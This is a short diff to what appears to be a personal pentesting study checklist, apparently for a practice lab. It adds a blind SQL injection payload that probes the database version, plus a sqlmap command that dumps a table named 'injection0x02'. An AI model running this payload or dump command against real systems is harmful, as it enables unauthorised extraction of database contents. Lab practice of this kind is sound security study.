@@ -59,6 +59,17 @@ sqlmap -r req.txt
 ```
 
 
+```
+substring((select version()), 1,1) = '7'#
+```
+
+
+```
+sqlmap -r req2.txt --level=2 --dump -T injection0x02
+```
+
+
+
 
 - [ ] XSS -DOM | Stored
 
